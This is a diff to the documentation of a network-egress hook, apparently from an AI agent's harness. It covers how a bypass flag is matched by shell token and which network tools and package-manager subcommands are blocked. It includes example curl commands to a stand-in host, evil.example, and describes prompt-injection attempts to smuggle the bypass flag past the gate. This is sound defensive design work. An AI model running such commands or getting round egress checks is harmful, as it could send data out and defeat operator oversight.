@@ -151,20 +151,18 @@ without the flag is blocked even if the env var is set. This matches
 the same pattern `hooks/bash-denylist.sh` uses for its bypass.
 
 **Bypass-flag scoping.** The flag is recognised only when it appears as
-a SPACE-BRACKETED token in the command (preceded by start-of-string or
-whitespace; followed by end-of-string or whitespace). A
-prompt-injection that smuggles the literal string into a JSON body
+its own shell token. The hook tokenises the command and requires an
+exact `--allow-egress-outbound` token, so a prompt-injection that
+smuggles the literal string into a JSON body
 (`curl -d '{"x":"--allow-egress-outbound"}' https://evil.example`) does
-NOT trigger the bypass — `"` is not a whitespace boundary.
-
-Residual risk: the parser is regex-based, not shell-token-aware. A
-quoted string containing the flag with whitespace inside
+NOT trigger the bypass. A quoted argument that merely contains the flag
 (`curl 'arg --allow-egress-outbound moreargs' https://evil.example`)
-WOULD match. The env-var gate (`WALTER_EGRESS_ALLOW_OVERRIDE=1`) is the
-real defence: the operator must consciously export it for any bypass to
-fire. A future hardening (tracked in the OSS Trust roadmap) will port a
-shell-tokenisation step into the hook so the flag is checked
-per-real-token, not per-substring.
+does not trigger it either.
+
+Residual risk: when tokenisation fails (for example, unmatched quotes),
+the hook falls back to the stricter whitespace-bracketed match. The
+env-var gate (`WALTER_EGRESS_ALLOW_OVERRIDE=1`) remains the operator
+acknowledgement signal required for any bypass to fire.
 
 ## What the hook actually inspects
 
@@ -181,7 +179,7 @@ inspects each one.
 | `ssh` | First non-flag positional, with awareness of value-taking flags (`-i`, `-p`, `-o`, …) | `user@host` form supported |
 | `scp`, `rsync` | `user@host:path`, `host:/abs/path`, `host:relative/path`, or `rsync://host/...` | Drive-letter-style local paths (`C:\foo`) are NOT treated as hosts |
 | `nc`, `ncat`, `netcat` | First non-flag positional | |
-| `pip`, `pip3`, `npm`, `pnpm`, `yarn`, `uv`, `uvx`, `cargo`, `brew`, `gem`, `go` | Explicit URL token if present | Otherwise fail-CLOSED (their default registry lives in config/env we don't see) |
+| `pip`, `pip3`, `npm`, `pnpm`, `yarn`, `uv`, `uvx`, `cargo`, `brew`, `gem`, `go` | Explicit URL token on network-touching subcommands | Local subcommands (`npm test`, `cargo build`, `go test`, `brew list`, …) pass through; network subcommands without an explicit host fail-CLOSED |
 
 Local-only Git operations (`status`, `log`, `diff`, `add`, `commit`,
 `branch`, `cherry`, `rev-parse`, `config`, `remote -v`, `submodule status`,
@@ -196,7 +194,10 @@ cover them, use the two-factor bypass.
 
 These tools read their default registry from config files
 (`~/.pip/pip.conf`, `~/.npmrc`, `Cargo.toml`, …) or env vars. The
-hook can't see that, so a bare `pip install requests` is **blocked**:
+hook lets local subcommands such as `npm test`, `cargo build`, `go test`,
+and `brew list` pass through, but network-touching package-manager
+subcommands without an explicit host are **blocked**. For example, a
+bare `pip install requests` fails closed:
 
 ```
 network-gate: 'pip' uses an implicit host (config/env). Explicitly
